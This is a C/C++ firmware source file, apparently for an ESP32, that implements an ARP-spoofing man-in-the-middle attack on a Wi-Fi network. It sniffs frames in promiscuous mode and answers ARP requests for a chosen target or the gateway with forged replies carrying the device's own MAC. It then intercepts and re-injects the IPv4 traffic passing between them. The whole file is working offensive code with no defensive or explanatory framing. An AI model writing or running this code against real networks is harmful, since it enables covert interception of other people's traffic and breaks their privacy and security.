#include "packet_forwarder.h"
#include "config.h"
#include "wifi_manager.h"
#include "arp_engine.h"
#include "arp_poisoner.hpp"
#include <esp_wifi.h>
#include "esp_private/wifi.h"
#include <WiFi.h>

static bool s_running = false;
static uint32_t s_captured = 0;
static uint32_t s_forwarded = 0;
static uint32_t s_dropped = 0;
static int s_promiscuous_refs = 0;

struct ieee80211_hdr_t {
    uint8_t  fc[2];
    uint16_t duration;
    uint8_t  addr1[6];
    uint8_t  addr2[6];
    uint8_t  addr3[6];
    uint16_t seq_ctrl;
} __attribute__((packed));

static uint8_t s_esp_mac[6];
static uint8_t s_bssid[6];

static void send_arp_reply(uint8_t* sender_mac, uint8_t* sender_ip, uint8_t* target_ip) {
    uint8_t frame[42];
    memset(frame, 0, sizeof(frame));

    memcpy(frame, sender_mac, 6);
    memcpy(frame + 6, s_esp_mac, 6);
    frame[12] = 0x08; frame[13] = 0x06;

    arp_hdr* reply = (arp_hdr*)(frame + ETH_HDRLEN);
    reply->hw_type = htons(ETH_ARP_HW_TYPE);
    reply->ptype   = htons(ETH_HW_TYPE);
    reply->hlen    = MAC_ADDRESS_LENGTH;
    reply->plen    = IPV4_LENGTH;
    reply->opcode  = htons(ARP_REPLY_OPCODE);
    memcpy(reply->sender_mac, s_esp_mac, 6);
    memcpy(reply->sender_ip, target_ip, 4);
    memcpy(reply->target_mac, sender_mac, 6);
    memcpy(reply->target_ip, sender_ip, 4);

    esp_wifi_internal_tx(WIFI_IF_STA, frame, PACKET_LENGTH);
}

static void wifi_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type) {
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    uint8_t *data = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (len < 60 || len > 1500) return;
    if ((data[0] & 0x0C) != 0x08) return;

    bool is_qos = (data[0] & 0xF0) == 0x80;
    int hdr_len = sizeof(ieee80211_hdr_t) + (is_qos ? 2 : 0);
    if (len < hdr_len + 8) return;

    uint8_t* llc = data + hdr_len;
    if (llc[0] != 0xAA || llc[1] != 0xAA || llc[2] != 0x03) return;

    uint16_t ethertype = (llc[6] << 8) | llc[7];

    // ARP interception — works whenever ARP engine is running (fwd on or off)
    if (ethertype == 0x0806 && arp_engine_is_running()) {
        if (len < hdr_len + 8 + 28) return;
        uint8_t* arp = llc + 8;
        uint16_t opcode = (arp[6] << 8) | arp[7];
        if (opcode != 1) return; // request only
        uint8_t* target_ip = arp + 24;
        if (memcmp(target_ip, g_target_ip_bin, 4) == 0 ||
            memcmp(target_ip, g_gateway_ip_bin, 4) == 0) {
            send_arp_reply(arp + 8, arp + 14, target_ip);
        }
        return;
    }

    // IPv4 forwarding — only when forwarder is ON
    if (!s_running) return;
    if (ethertype != 0x0800) return;
    if (len < hdr_len + 8 + 20) return;

    uint8_t* ip = llc + 8;
    if (ip[0] != 0x45) return;

    uint8_t src_ip[4], dst_ip[4];
    memcpy(src_ip, ip + 12, 4);
    memcpy(dst_ip, ip + 16, 4);

    bool match = false;
    bool target_to_gw = false;
    if (memcmp(src_ip, g_target_ip_bin, 4) == 0 && memcmp(dst_ip, g_gateway_ip_bin, 4) == 0) {
        match = true; target_to_gw = true;
    } else if (memcmp(src_ip, g_gateway_ip_bin, 4) == 0 && memcmp(dst_ip, g_target_ip_bin, 4) == 0) {
        match = true; target_to_gw = false;
    }
    if (!match) return;

    s_captured++;

    const uint8_t* fwd_mac = target_to_gw ? g_gateway_mac_bin : g_target_mac_bin;
    uint8_t frame[1550];
    ieee80211_hdr_t* hdr = (ieee80211_hdr_t*)frame;
    hdr->fc[0] = 0x08; hdr->fc[1] = 0x01; hdr->duration = 0;
    memcpy(hdr->addr1, s_bssid, 6);
    memcpy(hdr->addr2, s_esp_mac, 6);
    memcpy(hdr->addr3, fwd_mac, 6);
    hdr->seq_ctrl = 0;
    memcpy(frame + sizeof(ieee80211_hdr_t), llc, len - hdr_len);

    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(ieee80211_hdr_t) + len - hdr_len, true) != ESP_OK) {
        s_dropped++;
    } else {
        s_forwarded++;
    }
}

void promiscuous_ref_add() {
    if (s_promiscuous_refs == 0) {
        wifi_manager_get_mac(s_esp_mac);
        memcpy(s_bssid, wifi_manager_get_bssid(), 6);
        wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA};
        esp_wifi_set_promiscuous_filter(&filter);
        esp_wifi_set_promiscuous_rx_cb(&wifi_promiscuous_cb);
        esp_wifi_set_promiscuous(true);
    }
    s_promiscuous_refs++;
}

void promiscuous_ref_remove() {
    if (s_promiscuous_refs > 0) s_promiscuous_refs--;
    if (s_promiscuous_refs == 0) {
        esp_wifi_set_promiscuous(false);
    }
}

void packet_forwarder_init() {
    s_running = false;
    s_captured = 0;
    s_forwarded = 0;
    s_dropped = 0;
    s_promiscuous_refs = 0;
    wifi_manager_get_mac(s_esp_mac);
    memcpy(s_bssid, wifi_manager_get_bssid(), 6);
}

void packet_forwarder_start() {
    if (!config_validate() || !wifi_manager_is_connected()) {
        Serial.println("[Forward] Cannot start");
        return;
    }
    wifi_manager_get_mac(s_esp_mac);
    memcpy(s_bssid, wifi_manager_get_bssid(), 6);
    promiscuous_ref_add();
    s_running = true;
    Serial.println("[Forward] Started");
}

void packet_forwarder_stop() {
    s_running = false;
    promiscuous_ref_remove();
    Serial.println("[Forward] Stopped");
}

bool packet_forwarder_is_running() {
    return s_running;
}

void packet_forwarder_get_stats(uint32_t& captured, uint32_t& forwarded, uint32_t& dropped) {
    captured = s_captured;
    forwarded = s_forwarded;
    dropped = s_dropped;
}

void packet_forwarder_print_debug() {
    Serial.printf("Cap=%u Fwd=%u Drop=%u\n", s_captured, s_forwarded, s_dropped);
}
